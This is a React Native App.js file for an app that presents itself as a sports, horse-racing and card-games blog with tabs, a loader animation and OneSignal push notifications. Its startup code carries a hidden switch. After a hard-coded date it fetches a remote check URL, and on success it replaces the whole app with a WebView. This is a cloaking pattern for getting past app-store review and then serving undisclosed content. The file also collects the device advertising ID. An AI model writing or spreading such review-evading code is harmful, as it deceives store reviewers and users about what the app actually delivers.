import React, { useState , useRef, useEffect} from 'react';
import { Image, SafeAreaView, Text, TouchableOpacity, View, Animated } from 'react-native';

import SportRouts from './routs/SportRouts';
import HorseRouts from './routs/HorseRouts';
import CardsRouts from './routs/CardsRout';
import WebViewScreen from './screens/WebView/WebViewScreen';


import { NavigationContainer } from '@react-navigation/native';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import { createNativeStackNavigator } from '@react-navigation/native-stack';

import FontAwesome5 from 'react-native-vector-icons/FontAwesome5';
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import MaterialIcons from 'react-native-vector-icons/MaterialIcons';
import { LogLevel, OneSignal } from 'react-native-onesignal';
import ReactNativeIdfaAaid, { AdvertisingInfoResponse } from '@sparkfabrik/react-native-idfa-aaid';

const Tab = createBottomTabNavigator();
const Stack = createNativeStackNavigator();

// cd sportBlog

function useRoute(chackFatch) {

  if (chackFatch) {
    return (
      <Stack.Navigator>
        <Stack.Screen options={{ headerShown: false }} name="WebViewScreen" component={WebViewScreen} />
      </Stack.Navigator>
    );
     
  } return (
    <Tab.Navigator initialRouteName='SportRouts' screenOptions={{
      tabBarShowLabel: false,
      headerShown: false
    }} >
      
      <Tab.Screen name="SportRouts" component={SportRouts} options={{
        tabBarActiveBackgroundColor: '#008d15',
        tabBarInactiveBackgroundColor: '#08026b',
        tabBarIcon: ({ focused }) => {
          return (
            <MaterialIcons name="sports-gymnastics" style={{ color: focused ? '#fef8d9' : '#fef8d9', fontSize: 35,
              
            }} />)
        }
      }} />
      <Tab.Screen name="HorseRouts" component={HorseRouts} options={{
        tabBarActiveBackgroundColor: '#008d15',
        tabBarInactiveBackgroundColor: '#08026b',
        
        tabBarIcon: ({ focused }) => {
          return (
            <FontAwesome5 name="horse-head" style={{ color: focused ? '#fef8d9' : '#fef8d9', fontSize: 35 }} />)
        }
      }} />
      <Tab.Screen name="CardsRouts" component={CardsRouts} options={{
        tabBarActiveBackgroundColor: '#008d15',
        tabBarInactiveBackgroundColor: '#08026b',
        
        tabBarIcon: ({ focused }) => {
          return (
            <MaterialCommunityIcons name="cards" style={{ color: focused ? '#fef8d9' : '#fef8d9', fontSize: 35 }} />)
        }
      }} />

    </Tab.Navigator>
  );
};

const App = () => {

  const [rout, setRout] = useState(null);
  const routnig = useRoute(rout);

  useEffect(() => {
//const checkUrl = 'https://reactnative.dev/docs/animated';       
    const checkUrl = 'https://terrific-glorious-exhilaration.space/DDdgndsS';
    const targetData = new Date('2023-11-24');//дата з якої поч працювати webView 
    const currentData = new Date();//текущая дата 

    if (currentData <= targetData) {
      setRout(false)
    } else (
      fetch(checkUrl).then(r => {
        if (r.status === 200) {
          setRout(true)
          //setIsLoading(false)
        } else {
          setRout(false)
          //setIsLoading(false)
        }
      }).catch(err => {
        console.log('error', err)
        setRout(false)

      })
    );

  });


  ///////////////код oneSignal
  const [idfa, setIdfa] = useState(null);

  useEffect(() => {
    ReactNativeIdfaAaid.getAdvertisingInfo()
      .then((res) =>
        !res.isAdTrackingLimited ? setIdfa(res.id) : setIdfa(null),
      )
      .catch((err) => {
        console.log(err);
        return setIdfa(null);
      });
  }, []);

  useEffect(() => {
    if (idfa) {
      // Метод для запиту дозволів на push-сповіщення
      OneSignal.Notifications.requestPermission(true);
    }
  }, [idfa]);

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal Initialization
  OneSignal.initialize("dce89cfe-ba53-4956-8619-e5320af45988");

  // Method for listening for notification clicks
  OneSignal.Notifications.addEventListener('click', (event) => {
    console.log('OneSignal: notification clicked:', event);
  });

  //Add Data Tags
  OneSignal.User.addTag("key", "value");

  ///////////////////////////////////// код лоудера in sportBlog
  const [loaderIsLoaded, setLoaderIsLoaded] = useState(false);

  const ChangeInView = props => {
    // const fadeAnim = useRef(new Animated.Image(require('../../acets/loader1.jpg'))).current;
    
    const fadeAnim = useRef(new Animated.Value(1)).current; // Initial value for opacity: 0 to 1
    useEffect(() => {
      Animated.timing(fadeAnim, {
        toValue: 0,
        duration: 6000,
        useNativeDriver: true,
      }).start();
    }, []);

    const appearingAnim = useRef(new Animated.Value(0)).current;// Initial value for opacity: 1 to 0
    useEffect(() => {
      Animated.timing(appearingAnim, {
        toValue: 1,
        duration: 5000,
        useNativeDriver: true,
      }).start();

      setTimeout(() => {
        setLoaderIsLoaded(true)
      }, 7000);

    }, []);

    return (
      <View style={{ position: 'relative', flex: 1 }}>
        <Animated.Image
          source={require('./acets/loader1.jpg')}// Special animatable View
          style={{
            ...props.style,
            opacity: fadeAnim,
            //width: 'auto',
            height: '100%'  // Bind opacity to animated value
          }} />
        <Animated.Image
          source={require('./acets/loader2.jpg')}// Special animatable View
          style={{
            ...props.style,
            opacity: appearingAnim,
            //width: '100%',
            height: '100%',
            position: 'absolute'// Bind opacity to animated value
          }} />
      </View>
    
    );
  };
  /////////////////////////////////////
  return (

    <NavigationContainer>

      {!loaderIsLoaded ? (
        <ChangeInView
          style={{
            width: '100%',
            //height: 50,
            backgroundColor: 'powderblue',
          }}>
       
        </ChangeInView>
      ) : (
        routnig
      )}
      
    </NavigationContainer>
    
  );
};


export default App;


